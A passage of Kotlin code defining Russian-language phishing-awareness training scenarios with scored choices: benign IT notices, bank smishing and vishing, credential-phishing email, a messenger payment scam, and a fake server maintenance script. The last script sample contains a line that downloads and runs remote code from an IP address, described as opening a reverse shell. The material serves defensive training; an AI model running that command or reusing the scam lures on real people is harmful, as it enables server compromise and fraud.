                    simChatForwardFrom = "Канал «HR — объявления» (верифицирован)",
                    simChatSenderLabel = "Екатерина · переслано",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "mib-1-note",
                            title = "Регламент",
                            body = "Объявления об отпусках публикуются в верифицированном HR-канале и на интранете. Домен acme-corp.example — корпоративный; внешних «бонусных» доменов и таймеров здесь нет.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "mib-1-link",
                            label = "Открыть ссылку intranet…/leave-requests",
                            choiceId = "mib-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "mib-1-ok",
                            label = "Проверить домен и открыть во внутренней среде",
                            choiceId = "mib-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "mib-1-leak",
                            label = "Поделиться ссылкой во внешнем чате",
                            choiceId = "mib-1-c",
                            variant = "SHARE",
                        ),
                    ),
                    pressureSeconds = 45,
                ),
            ),
        )

        /** Календарь: обычное приглашение от IT с доменом организации и ссылкой Microsoft Teams. */
        fun calendarLegitInvite(): InternalScenario = InternalScenario(
            id = "calendar-legit-invite",
            title = "Календарь: плановый бриф от IT",
            type = ScenarioType.EMAIL,
            description = "В календаре — стандартное приглашение от IT на корпоративном домене, без угроз и без подозрительных ссылок.",
            attackTypeLabel = "Угрозы нет (легитимное приглашение)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "cli-1",
                    situationBrief = """
                        В корпоративном календаре появилось приглашение от IT: короткий бриф по обновлению политики паролей.
                        Организатор — адрес с домена компании; в описании — типичная ссылка присоединения к Teams.
                    """.trimIndent(),
                    narrative = """
                        Добрый день. Приглашаем на 30-минутный информационный созвон: что меняется в политике паролей и MFA.

                        Подключение:
                        https://teams.microsoft.com/l/meetup-join/19%3ameeting_example%40thread.v2/0?context=%7b%22Tid%22%3a%22…%22%7d

                        Запись не требуется — достаточно присутствия руководителей групп. Вопросы можно задать в тикет-системе после встречи.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "cli-1-a",
                            label = "Отклоню все приглашения от IT без чтения — так безопаснее от фишинга",
                            correct = false,
                            explanationWhenChosen = "Полный бойкот легитимных приглашений мешает работе. Важно различать признаки подделки и нормальные корпоративные приглашения.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "cli-1-b",
                            label = "Приму приглашение и подключусь через кнопку в календаре: организатор с корпоративного домена, ссылка teams.microsoft.com",
                            correct = true,
                            explanationWhenChosen = "Верно: домен организации в поле организатора и официальный хост Teams — типичная безопасная картина. Угрозы в условиях нет.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "cli-1-c",
                            label = "Войду по «такой же» ссылке из SMS или личного WhatsApp, если пришлют",
                            correct = false,
                            explanationWhenChosen = "Дубли встреч во внешних каналах могут быть подделкой. Ориентируйтесь на запись в корпоративном календаре и известные контакты IT.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CALENDAR_INVITE,
                    emailSubject = "IT: бриф по обновлению политики паролей и MFA",
                    emailFrom = "IT Календарь <it-calendar@acme-corp.example>",
                    simCalendarWhen = "Чт, 11:00–11:30 (Europe/Moscow)",
                    simCalendarWhere = "Microsoft Teams — ссылка в описании (корпоративная учётная запись)",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "cli-1-hint",
                            title = "На что смотреть",
                            body = "Здесь нет угроз блокировки учётки, нет посторонних доменов вместо Microsoft и нет давления «за два часа». Это соответствует обычным служебным приглашениям.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "cli-1-decline",
                            label = "Отклонить все от IT",
                            choiceId = "cli-1-a",
                            variant = "REPLY",
                        ),
                        InternalHotspot(
                            id = "cli-1-join",
                            label = "Присоединиться к Microsoft Teams",
                            choiceId = "cli-1-b",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "cli-1-side",
                            label = "Искать вход по ссылке из личного мессенджера",
                            choiceId = "cli-1-c",
                            variant = "ACTION",
                        ),
                    ),
                    pressureSeconds = 50,
                ),
            ),
        )

        /** Расширение из белого списка ИТ с узкими разрешениями — установка укладывается в политику. */
        fun extensionAllowlistBenign(): InternalScenario = InternalScenario(
            id = "extension-allowlist-benign",
            title = "Расширение из списка ИТ",
            type = ScenarioType.EMAIL,
            description = "В каталоге — утверждённое корпоративное расширение с минимальными правами и издателем организации.",
            attackTypeLabel = "Угрозы нет (политика ИТ)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "eab-1",
                    situationBrief = """
                        Вы открыли карточку расширения, которое ИТ разослало в рассылке как добавленное в белый список.
                        Запрашиваются только права на почту и календарь Google Workspace в рамках рабочего домена — без «всех сайтов».
                    """.trimIndent(),
                    narrative = """
                        Запрашиваемые разрешения:
                        • Читать и изменять данные на сайтах mail.google.com и calendar.google.com
                        • Показывать уведомления

                        Подпись издателя проверена (Acme Corp). Установка через корпоративную политику Chrome.
                    """.trimIndent(),
                    simExtensionName = "Acme Workspace Toolbar",
                    simExtensionPublisher = "Acme Corporation (IT)",
                    simExtensionBlurb = "Корпоративные шаблоны писем и быстрые ссылки на тикеты — только для рабочего аккаунта.",
                    choices = listOf(
                        InternalChoice(
                            id = "eab-1-a",
                            label = "Установлю из магазина по инструкции ИТ — права узкие, издатель компания",
                            correct = true,
                            explanationWhenChosen = "Верно: типичный безопасный паттерн — утверждённый список, ограниченные хосты, известный издатель. Угрозы в описанных условиях нет.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "eab-1-b",
                            label = "Поставлю «аналог» с похожим названием со стороннего сайта — так быстрее",
                            correct = false,
                            explanationWhenChosen = "Обход магазина и неофициальные копии — основной риск. Даже если карточка в каталоге выглядит безопасно, установка должна идти по каналу ИТ.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Сторонняя сборка могла содержать вредоносный код. Удалите неизвестное расширение и обратитесь в ИТ.",
                        ),
                        InternalChoice(
                            id = "eab-1-c",
                            label = "Откажусь от любых расширений, даже из списка ИТ — иначе не сплю спокойно",
                            correct = false,
                            explanationWhenChosen = "Избыточный отказ от утверждённых инструментов снижает продуктивность без выигрыша в безопасности, если политика соблюдена.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EXTENSION_STORE,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "eab-1-pol",
                            title = "Политика",
                            body = "ИТ публикует список разрешённых расширений и способ установки. Нет запроса «прочитать все сайты», нет неизвестного издателя — сценарий штатный.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "eab-1-install",
                            label = "Установить (по инструкции ИТ)",
                            choiceId = "eab-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "eab-1-side",
                            label = "Скачать аналог с другого сайта",
                            choiceId = "eab-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "eab-1-refuse",
                            label = "Отказаться от утверждённого расширения",
                            choiceId = "eab-1-c",
                            variant = "ACTION",
                        ),
                    ),
                ),
            ),
        )

        /** Обычное письмо IT о плановых работах: корпоративный домен, нейтральный тон, ссылка только на статус интранета. */
        fun emailItMaintenanceBenign(): InternalScenario = InternalScenario(
            id = "email-it-maintenance-benign",
            title = "Почта: плановые работы IT",
            type = ScenarioType.EMAIL,
            description = "Информационное письмо о окне обслуживания VPN: без запроса паролей и без посторонних доменов.",
            attackTypeLabel = "Угрозы нет (служебное уведомление)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "eit-1",
                    situationBrief = """
                        Утром в почте — уведомление от IT о плановом окне обслуживания VPN в выходные.
                        Тон нейтральный, вложений нет, пароль не просят.
                    """.trimIndent(),
                    narrative = """
                        Коллеги, в субботу с 02:00 до 04:00 (МСК) будет недоступен корпоративный VPN для профилактики.
                        Статус и переносы — на странице https://status.intranet.acme-corp.example

                        Вопросы: it-help@acme-corp.example или тикет в ServiceNow. С уважением, команда IT.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "eit-1-a",
                            label = "Считаю письмо подозрительным и перешлю всему отделу с просьбой никому не заходить в почту",
                            correct = false,
                            explanationWhenChosen = "Массовая паника без анализа создаёт шум. Сначала проверьте отправителя и домен ссылок — здесь они корпоративные и сценарий штатный.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "eit-1-b",
                            label = "Оценю отправителя и ссылку: домен компании, нет срочности и кражи учётки — это обычное сервисное уведомление",
                            correct = true,
                            explanationWhenChosen = "Верно: признаки фишинга отсутствуют. Достаточно учесть окно работ при планировании задач; при сомнениях можно подтвердить в тикет-системе одним запросом, а не паникой.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "eit-1-c",
                            label = "Введу пароль на всякий случай по ссылке из письма «для проверки доступа»",
                            correct = false,
                            explanationWhenChosen = "В этом письме пароль не запрашивается — если бы появилась такая форма на сторонней странице, это был бы красный флаг. Не вводите учётные данные по сомнительным запросам.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Вы сошлись с вымышленным сценарием: на реальной фишинговой странице учётные данные могли бы утечь. Всегда сверяйте, что от вас вообще просят.",
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Плановое обслуживание VPN: суббота 02:00–04:00 МСК",
                    emailFrom = "IT Notifications <it-noreply@acme-corp.example>",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "eit-1-chk",
                            title = "Чек-лист",
                            body = "Корпоративный From, ссылка на status.intranet.*, нет вложений и угроз блокировки — типовое легитимное уведомление.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "eit-1-panic",
                            label = "Переслать всем: «не заходить в почту»",
                            choiceId = "eit-1-a",
                            variant = "SHARE",
                        ),
                        InternalHotspot(
                            id = "eit-1-ok",
                            label = "Принять как сервисное уведомление",
                            choiceId = "eit-1-b",
                            variant = "FROM",
                        ),
                        InternalHotspot(
                            id = "eit-1-pw",
                            label = "«Подтвердить паролем» на сторонней странице",
                            choiceId = "eit-1-c",
                            variant = "LINK",
                        ),
                    ),
                    narrativeNoise = """
                        ---
                        Вы получили это письмо как сотрудник Acme Corp. Не отвечайте на этот адрес — создано автоматически.
                        RITM-448821 · Internal · Confidential
                    """.trimIndent(),
                    pressureSeconds = 40,
                ),
            ),
        )

        /** Смсишинг «банк»: блокировка карты и ссылка; второй шаг — поддельный домен входа. */
        fun consumerBankSmishingAndFakeSite(): InternalScenario = InternalScenario(
            id = "smishing-bank-card-unblock",
            title = "СМС: «карта ограничена», ссылка на «разблокировку»",
            type = ScenarioType.SOCIAL,
            description = "Типичная схема для граждан: SMS или мессенджер от имени банка, срочная ссылка и фишинговая страница входа.",
            attackTypeLabel = "Смсишинг и фишинговый сайт",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "sbs-1",
                    situationBrief = """
                        Вы обычный пользователь смартфона. Приходит сообщение, похожее на SMS или push банка:
                        карта временно ограничена, чтобы снять ограничение — перейти по короткой ссылке.
                    """.trimIndent(),
                    narrative = """
                        MyBank: Карта *4567 ограничена по соображениям безопасности.
                        Разблокировка: https://mybank-id-unlock.net/fw/7k2m
                        Не отвечайте на это сообщение. «Горячая линия»: +7 (900) 111-22-33
                    """.trimIndent(),
                    narrativeNoise = "МТС: остаток пакета 1.2 ГБ · Доставка Ozon завтра",
                    choices = listOf(
                        InternalChoice(
                            id = "sbs-1-a",
                            label = "Перейду по ссылке из сообщения — так быстрее разблокируют",
                            correct = false,
                            explanationWhenChosen = "Ссылки в SMS от имени банка часто ведут на фишинг. Номер «поддержки» в том же сообщении может быть поддельным.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Страница могла украсть логин и пароль от банка. Срочно позвоните в банк по номеру с карты и смените доступы через официальное приложение.",
                        ),
                        InternalChoice(
                            id = "sbs-1-b",
                            label = "Открою официальное приложение банка или наберу номер с оборота карты / с сайта банка — не из этого сообщения",
                            correct = true,
                            explanationWhenChosen = "Верно: канал, который вы сами открыли из надёжного источника, а не ссылка из непроверенного текста.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "sbs-1-c",
                            label = "Перешлю скриншот и ссылку родственнику: «это правда?»",
                            correct = false,
                            explanationWhenChosen = "Распространение ссылки увеличивает шанс, что кто-то кликнет. Лучше предупредить словами без активной ссылки.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Сообщения",
                    simChatSenderLabel = "MyBank",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "sbs-1-hint",
                            title = "Смсишинг",
                            body = "Банки редко просят перейти по произвольной короткой ссылке в SMS для «разблокировки». Домен mybank-id-unlock.net не совпадает с официальным сайтом организации.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "sbs-1-link",
                            label = "Открыть ссылку mybank-id-unlock.net",
                            choiceId = "sbs-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "sbs-1-app",
                            label = "Приложение банка / номер с карты",
                            choiceId = "sbs-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sbs-1-fwd",
                            label = "Переслать ссылку близким",
                            choiceId = "sbs-1-c",
                            variant = "SHARE",
                        ),
                    ),
                    pressureSeconds = 55,
                ),
                InternalStep(
                    id = "sbs-2",
                    situationBrief = """
                        Представьте, что вы уже на странице «входа в банк», открытой по ссылке из сомнительного сообщения.
                        Сравните два адреса так, как в строке браузера перед вводом пароля.
                    """.trimIndent(),
                    narrative = "Какой адрес вы бы выбрали для ввода пароля, если бы не знали контекста письма — только строку URL?",
                    choices = listOf(
                        InternalChoice(
                            id = "sbs-2-a",
                            label = "Правый адрес — короче и с «id», похоже на сервис безопасности",
                            correct = false,
                            explanationWhenChosen = "Короткое имя и слово «unlock» не делают домен официальным. Смотрите на зону и совпадение с известным сайтом банка.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Пароль мог утечь на поддельный хостинг. Смените пароль только через официальный канал.",
                        ),
                        InternalChoice(
                            id = "sbs-2-b",
                            label = "Левый адрес — поддомен известного банковского домена; правый — посторонний сайт",
                            correct = true,
                            explanationWhenChosen = "Верно: online.mybank.example в зоне банка; mybank-id-unlock.net — отдельный домен, типичный для фишинга.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "sbs-2-c",
                            label = "Зайду на оба и сравню дизайн страниц",
                            correct = false,
                            explanationWhenChosen = "Даже открытие поддельной страницы и ввод данных — риск. Достаточно сравнить домены без «пробного» входа.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.MINI_URL_COMPARE,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "sbs-2-dom",
                            title = "Домены",
                            body = "Официальный вход обычно на домене организации (например online.mybank.example). Отдельные домены с дефисами и словами unlock/secure часто фишинговые.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    urlCompareGame = InternalUrlCompareGame(
                        leftUrl = "https://online.mybank.example/login",
                        rightUrl = "https://mybank-id-unlock.net/login",
                        leftChoiceId = "sbs-2-b",
                        rightChoiceId = "sbs-2-a",
                        caption = "Слева — адрес в зоне известного банка; справа — отдельный домен. Выберите действие, как на практике.",
                    ),
                    narrativeNoise = "Баннер: «Кредит 0% — одобрение за 1 минуту»",
                    pressureSeconds = 50,
                ),
            ),
        )

        /** Вишинг: звонок «антифрод» с просьбой назвать код из SMS и данные карты. */
        fun consumerBankVishing(): InternalScenario = InternalScenario(
            id = "vishing-bank-fake-security-call",
            title = "Звонок «служба безопасности банка»",
            type = ScenarioType.SOCIAL,
            description = "Мошенники представляются антифродом, знают последние цифры карты (из утечек) и просят код из SMS «для отмены перевода».",
            attackTypeLabel = "Вишинг",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "cv-1",
                    situationBrief = """
                        Вам звонят на личный телефон. Голос уверенный: «Служба безопасности MyBank, зафиксирована попытка перевода 87 000 ₽.
                        Чтобы отменить операцию, назовите код из SMS и полный номер карты для сверки».
                    """.trimIndent(),
                    narrative = """
                        Звонок с обычного мобильного номера. Собеседник называет ваши имя и последние 4 цифры карты (такие данные часто утекают).
                        Просят срочно продиктовать одноразовый код из свежего SMS — «иначе спишут деньги через 2 минуты».
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "cv-1-a",
                            label = "Продиктую код из SMS — нужно же отменить перевод",
                            correct = false,
                            explanationWhenChosen = "Код из SMS часто является подтверждением перевода или смены настроек. Настоящий банк не просит продиктовать его незнакомцу по телефону.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Мошенники могли подтвердить перевод или привязку устройства. Немедленно заблокируйте карту через приложение и позвоните в банк по официальному номеру.",
                        ),
                        InternalChoice(
                            id = "cv-1-b",
                            label = "Положу трубку и сам наберу номер банка с карты или из официального приложения — не перезванивая на входящий",
                            correct = true,
                            explanationWhenChosen = "Верно: инициатор звонка должен быть вы, а номер — из проверенного источника, а не «тот, с которого позвонили».",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "cv-1-c",
                            label = "Раз они знают последние цифры карты, значит это точно банк",
                            correct = false,
                            explanationWhenChosen = "Фрагменты данных из утечек не подтверждают личность звонящего. Это стандартный приём вишинга.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.GENERIC,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "cv-1-vish",
                            title = "Вишинг",
                            body = "Подмена номера (spoofing) и знание кусков PII из баз утечек делают звонок правдоподобным. Коды OTP никому не диктуют.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "cv-1-otp",
                            label = "Назвать код из SMS",
                            choiceId = "cv-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cv-1-hang",
                            label = "Положить трубку и позвонить в банк самому",
                            choiceId = "cv-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "cv-1-trust",
                            label = "Доверять из-за последних цифр карты",
                            choiceId = "cv-1-c",
                            variant = "ACTION",
                        ),
                    ),
                    pressureSeconds = 60,
                ),
            ),
        )

        /** Письмо про «взлом» и утечку пароля с другого сайта — развод на ввод пароля (релевантно credential stuffing). */
        fun credentialStuffingPhishEmail(): InternalScenario = InternalScenario(
            id = "credential-stuffing-fake-lockout",
            title = "Почта: «пароль светится в утечке — срочно войдите»",
            type = ScenarioType.EMAIL,
            description = "Фишинг под уведомление о компрометации: если один и тот же пароль на разных сервисах, мошенники подталкивают ввести его на поддельной странице.",
            attackTypeLabel = "Credential stuffing / фишинг",
            hubChannel = ScenarioHubChannel.MAIL,
            steps = listOf(
                InternalStep(
                    id = "csf-1",
                    situationBrief = """
                        В личной почте письмо от имени крупного сервиса: ваш пароль якобы найден в утечке, аккаунт заблокирован до подтверждения.
                        Ссылка ведёт на домен, похожий на название бренда, но не официальный.
                    """.trimIndent(),
                    narrative = """
                        Мы обнаружили вход с IP в Бразилии и совпадение вашего пароля с базой утечек 2024 года.
                        Войдите по ссылке ниже в течение 24 часов, иначе аккаунт будет удалён.

                        Подтвердить доступ: https://meta-secure-login-verify.net/account/recover
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "csf-1-a",
                            label = "Перейду по ссылке и введу пароль — так восстановлю доступ",
                            correct = false,
                            explanationWhenChosen = "Ввод пароля на странице по ссылке из письма — цель фишинга. Домен meta-secure-login-verify.net не является официальным доменом компании.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Пароль мог попасть к мошенникам и использоваться для перебора (stuffing) на других сайтах, если вы повторно используете пароли.",
                        ),
                        InternalChoice(
                            id = "csf-1-b",
                            label = "Не перехожу; открою сервис из приложения или закладки; сменю пароль там; включу двухфакторку; на других сайтах — другие пароли (менеджер паролей)",
                            correct = true,
                            explanationWhenChosen = "Верно: утечки реальны, но проверка и смена — только через официальные каналы. Уникальные пароли и MFA резко снижают ущерб от stuffing.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "csf-1-c",
                            label = "Один надёжный пароль на все сайты — так проще не забыть",
                            correct = false,
                            explanationWhenChosen = "Один пароль на всё — именно то, что делает credential stuffing опасным: одна утечка открывает десятки сервисов.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Срочно: аккаунт заблокирован — подтвердите после утечки пароля",
                    emailFrom = "Security Team <no-reply@meta-secure-login-verify.net>",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "csf-1-stuff",
                            title = "Credential stuffing",
                            body = "Злоумышленники автоматически пробуют пары email+пароль из старых утечек. Отдельные пароли и MFA это ломают. Письмо же может быть полностью вымышленным поводом для клика.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "csf-1-link",
                            label = "Ссылка «Подтвердить доступ»",
                            choiceId = "csf-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "csf-1-safe",
                            label = "Официальное приложение / смена пароля без ссылки из письма",
                            choiceId = "csf-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "csf-1-reuse",
                            label = "Один пароль везде удобнее",
                            choiceId = "csf-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    narrativeNoise = """
                        ---
                        Вы получили это письмо, потому что подписаны на рассылку Meta. Отписаться можно в настройках.
                        © 2026 Meta · Защита аккаунта
                    """.trimIndent(),
                    pressureSeconds = 65,
                ),
            ),
        )

        /** Мессенджер: «знакомый» просит срочно перевести на новую карту — подмена реквизитов для частных лиц. */
        fun personalRequisitesScamMessenger(): InternalScenario = InternalScenario(
            id = "chat-friend-new-card-scam",
            title = "Чат: «переведи на новую карту, моя заблокирована»",
            type = ScenarioType.SOCIAL,
            description = "BEC-подобная схема для людей: в WhatsApp/Telegram «родственник или друг» просит срочный перевод на новые реквизиты.",
            attackTypeLabel = "Социальная инженерия / подмена реквизитов",
            hubChannel = ScenarioHubChannel.SOCIAL,
            steps = listOf(
                InternalStep(
                    id = "crs-1",
                    situationBrief = """
                        Вам пишет контакт с именем и аватаром знакомого человека в мессенджере.
                        Текст срочный: старая карта недоступна, нужен перевод на «новую», реквизиты в сообщении.
                    """.trimIndent(),
                    narrative = """
                        Привет, это я. Мою карту на день заблокировали после покупки за границей, не могу оплатить аренду.
                        Перекинь пожалуйста 18 500 ₽ на эту, до вечера разблокируют: Т-Банк *6314 получатель ИП …

                        Только не звони — в метро плохо ловит 🙏
                    """.trimIndent(),
                    narrativeNoise = "Голосовое: 0:03 · Стикер 👍",
                    choices = listOf(
                        InternalChoice(
                            id = "crs-1-a",
                            label = "Переведу сразу — человеку срочно, потом разберёмся",
                            correct = false,
                            explanationWhenChosen = "Срочность и запрет позвонить — красные флаги. Взломанные и клонированные аккаунты часто просят перевод на чужие реквизиты.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Деньги ушли мошенникам; возврат затруднён. Всегда верифицируйте реквизиты голосом по номеру, который знали до переписки.",
                        ),
                        InternalChoice(
                            id = "crs-1-b",
                            label = "Позвоню по номеру из телефонной книги (не из чата) или встречу лично — реквизиты подтвержу вторым каналом",
                            correct = true,
                            explanationWhenChosen = "Верно: любые новые реквизиты от «знакомого» в чате подтверждаются независимо от переписки.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "crs-1-c",
                            label = "Спрошу в том же чате: «Ты точно не бот?» — если ответит нормально, переведу",
                            correct = false,
                            explanationWhenChosen = "Атакующий контролирует чат и ответит «да». Это не проверка личности.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "WhatsApp · Кирилл",
                    simChatSenderLabel = "Кирилл",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "crs-1-bec",
                            title = "Подмена для частных лиц",
                            body = "Схема как у BEC: доверие к каналу и срочность. Отличие — суммы P2P и личный контекст. Реквизиты только после звонка на старый номер или личного контакта.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "crs-1-pay",
                            label = "Перевести на карту из сообщения",
                            choiceId = "crs-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "crs-1-call",
                            label = "Звонок по номеру из контактов",
                            choiceId = "crs-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "crs-1-chat",
                            label = "Уточнить в том же чате",
                            choiceId = "crs-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    pressureSeconds = 55,
                ),
            ),
        )

        /** Living-off-the-Land: вредоносный скрипт обслуживания с reverse shell. */
        fun terminalTrojanScript(): InternalScenario = InternalScenario(
            id = "terminal-trojan-script",
            title = "Легенда об обслуживании",
            type = ScenarioType.EMAIL,
            description = "Коллега из DevOps прислал «плановый» скрипт обслуживания сервера. Внутри — строка для обратного шелла, замаскированная среди легитимных команд.",
            attackTypeLabel = "LOTL / вредоносный скрипт (Living off the Land)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                // ── Шаг 1: письмо с просьбой запустить скрипт ──────────────────────────
                InternalStep(
                    id = "tts-1",
                    situationBrief = """
                        Ночная смена. В почте — письмо от «Дениса из DevOps» с просьбой срочно
                        запустить скрипт обслуживания на prod-сервере до закрытия окна в 02:15.
                    """.trimIndent(),
                    narrative = """
                        Привет,

                        Нам открыли окно обслуживания prod-app-01 до 03:00.
                        Нужно запустить скрипт до апдейта — без него накатить патч не выйдет.
                        Скрипт лежит в /home/user/maintenance.sh (закинул через Jenkins).

                        Запусти как можно скорее, deadline — 02:15.

                        Денис
                    """.trimIndent(),
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "Срочно: запусти скрипт до 02:15 — окно обслуживания prod-app-01",
                    emailFrom = "Denis Korolev <d.korolev@devops-corp-team.ru>",
                    pressureSeconds = 75,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "tts-1-domain",
                            title = "Домен отправителя",
                            body = "devops-corp-team.ru — не корпоративный домен. Настоящие сотрудники DevOps пишут с @corp.ru или через тикеты ITSM. WHOIS: зарегистрирован 4 дня назад.",
                        ),
                        InternalInvestigationPanel(
                            id = "tts-1-process",
                            title = "Процедура Change Management",
                            body = "Плановые работы на production-серверах согласуются через Change Advisory Board (CAB) с Change ID. Запрос запустить скрипт «по письму в 02:00» без тикета — нарушение процедуры и красный флаг.",
                        ),
                    ),
                    investigationBonusThreshold = 2,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "tts-1-run",
                            label = "Запустить скрипт сейчас",
                            choiceId = "tts-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "tts-1-check",
                            label = "Открыть скрипт в терминале",
                            choiceId = "tts-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "tts-1-reply",
                            label = "Ответить «нет прав на этот сервер»",
                            choiceId = "tts-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "tts-1-a",
                            label = "Запущу без проверки — коллеги ждут, deadline горит",
                            correct = false,
                            explanationWhenChosen = "Запускать скрипты под давлением дедлайна без проверки — именно то, на что рассчитывают атакующие. Срочность подавляет критическое мышление.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "В 02:12 скрипт выполнил curl и запустил reverse shell. prod-app-01 скомпрометирован. Злоумышленник получил интерактивную оболочку с правами сервисного аккаунта.",
                        ),
                        InternalChoice(
                            id = "tts-1-b",
                            label = "Сначала изучу содержимое скрипта в терминале",
                            correct = true,
                            explanationWhenChosen = "Правильно. Любой скрипт независимо от источника нужно проверять перед запуском — особенно в production-среде и особенно когда есть давление срочности.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "tts-1-c",
                            label = "Отвечу: «у меня нет прав на этот сервер»",
                            correct = false,
                            explanationWhenChosen = "Уклонение без сообщения в ИБ — не решение. Подозрительное письмо нужно зафиксировать как инцидент, даже если вы не выполняете запрос.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
                // ── Шаг 2: терминал со скриптом ────────────────────────────────────────
                InternalStep(
                    id = "tts-2",
                    situationBrief = """
                        Вы открыли maintenance.sh в терминале.
                        Нажмите «Сканировать» для подсветки сетевых команд.
                        Кликните по любой строке — увидите пояснение.
                    """.trimIndent(),
                    narrative = """#!/bin/bash
# Maintenance script v2.3 — DevOps Automation System
# Server: prod-app-01.corp.local | 2024-01-15
# Requested-by: d.korolev@devops-corp-team.ru

echo "[INFO] Starting maintenance cycle..."

systemctl restart nginx
systemctl restart postgresql
echo "[OK] Services restarted"

find /var/log/app -name "*.log" -mtime +30 -delete
echo "[OK] Log cleanup complete"

sysctl -w net.ipv4.tcp_keepalive_time=600
sysctl -w vm.swappiness=10
echo "[OK] Kernel parameters updated"

apt-get update -qq && apt-get upgrade -y -qq 2>/dev/null
echo "[OK] System packages updated"

curl -s http://185.220.101.47/sync.sh | bash &
echo "[INFO] Maintenance complete. $(date)" """.trimIndent(),
                    uiKind = StepUiKind.TERMINAL_SESSION,
